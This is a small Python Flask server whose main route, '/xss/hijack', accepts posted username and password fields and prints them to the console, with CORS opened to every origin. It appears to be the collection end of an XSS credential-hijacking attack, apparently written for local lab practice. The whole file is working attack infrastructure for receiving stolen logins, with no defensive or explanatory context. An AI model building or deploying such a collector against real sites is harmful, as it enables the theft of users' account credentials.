import requests
import urllib3
from flask import Flask, jsonify, request
from flask_cors import CORS

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app, supports_credentials=True, origins='*')


@app.route("/")
def hello():
    print("heihei!!")
    return "Hello, World!"


@app.route("/xss/hijack", methods=["POST"])
def test_csrf():
    username = request.form.get("txtUserName")
    password = request.form.get("txtPassword")
    print("账号：" + username + " 密码：" + password)
    return "Success"


if __name__ == "__main__":
    app.run(host='127.0.0.1', port=8082)
